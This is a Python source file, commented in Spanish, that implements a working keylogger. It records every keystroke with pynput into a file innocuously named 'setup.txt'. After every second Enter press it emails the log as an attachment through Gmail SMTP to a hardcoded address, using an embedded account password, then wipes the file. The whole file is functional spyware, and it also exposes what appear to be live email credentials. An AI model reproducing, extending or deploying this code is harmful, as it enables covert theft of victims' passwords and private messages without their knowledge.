import pynput
import smtplib
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import time


sendCount = 0
keys = []

###############################################  REGISTRO DE TECLAS  ###################################################
def on_press(key):
    global keys, count, sendCount
    keys.append(key)
    write_file(keys)
    keys = []

    if key == Key.enter:
        sendCount += 1

    if (sendCount == 2):
        sendCount = 0
        SendEmail()
        x = open("setup.txt", "w")
        x.close()

def write_file(keys):
    with open("setup.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


#def on_release(key):
#    if key == Key.esc:
#        return False

###############################################  ENVIO DE EMAIL  #######################################################

def SendEmail():

    # Credenciales del email

    sender_address = 'loganalize701@gmail.com'
    sender_pass = 'rvSXgALUbmv8fit'
    receiver_address = 'rr4927563@gmail.com'
    date_hour = time.strftime("%c")
    
    # Setup the MIME
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = date_hour

    # Adjunto del email

    attach_file_name = 'setup.txt'
    attach_file = open(attach_file_name, 'rb')  # Abrir el archivo en modo binario

    payload = MIMEBase('application', 'octet-stream')
    payload.set_payload((attach_file).read())
    encoders.encode_base64(payload)  # Cifrar el adjunto

    # Añadir payload header con filename
    payload.add_header('content-disposition', 'attachment', filename='%s' % 'log.txt')
    message.attach(payload)

    # Se crea una sesion SMTP para enviar el email
    session = smtplib.SMTP('smtp.gmail.com', 587)  # Utilizar gmail con el puerto
    session.starttls()  # Habilitar seguridad
    session.login(sender_address, sender_pass)  # Logearse con las credenciales
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()

########################################################################################################################


with Listener(on_press=on_press) as listener:
    listener.join()